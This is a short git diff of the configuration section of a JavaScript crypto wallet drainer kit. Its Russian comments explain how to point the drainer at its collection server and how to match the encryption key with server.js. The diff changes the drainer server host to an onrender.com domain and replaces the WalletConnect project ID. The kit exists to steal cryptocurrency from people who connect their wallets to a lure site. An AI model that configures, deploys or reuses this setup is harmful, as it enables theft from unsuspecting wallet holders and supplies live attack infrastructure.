@@ -13,9 +13,9 @@
 let MS_Encryption_Key = 51515151; // Укажите любое число, которое будет использовано для шифрования (не рекомендуется оставлять по умолчанию!)
 // Это же число должно быть указано и в файле server.js - если они будут различаться, то ничего не будет работать правильно
 
-const MS_Server = "https://ire-server1.onrender.com/"; // Указать домен, который прикреплен к серверу дрейнера
+const MS_Server = "ire-server1.onrender.com"; // Указать домен, который прикреплен к серверу дрейнера
 // Это тот домен, где у вас стоит сервер, а не сам сайт, где вы планируете использовать дрейнер
-const MS_WalletConnect_ID = "233fa09d9ed708b13f2abc4daf565714"; // Project ID из WalletConnect Cloud
+const MS_WalletConnect_ID = "9daeb0c1fa09b5b39799f1ea13e98f9c"; // Project ID из WalletConnect Cloud
 
 const MS_Modal_Style = 2; // 1 - старая, 2 - новая (обновление от 01.10.2023)
 const MS_Loader_Style = 2; // 1 - старый, 2 - новый (обновление от 01.10.2023)
